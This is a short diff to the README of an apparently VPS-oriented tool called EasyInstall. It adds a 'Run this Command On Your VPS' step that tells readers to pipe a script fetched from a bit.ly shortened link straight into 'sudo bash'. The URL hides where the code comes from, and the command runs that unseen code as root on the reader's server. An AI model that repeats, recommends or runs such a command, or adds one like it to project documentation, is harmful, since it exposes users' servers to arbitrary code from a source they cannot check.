@@ -7,6 +7,8 @@
 [![512MB Optimized](https://img.shields.io/badge/Optimized-512MB%20VPS-blue.svg)]()
 
 ---
+### Run this Command On Your VPS 
+#  '  wget -qO- http://bit.ly/4aZ9030 | sudo bash  '
 
 ## 📋 Table of Contents
 - [What is EasyInstall?](#-what-is-easyinstall)
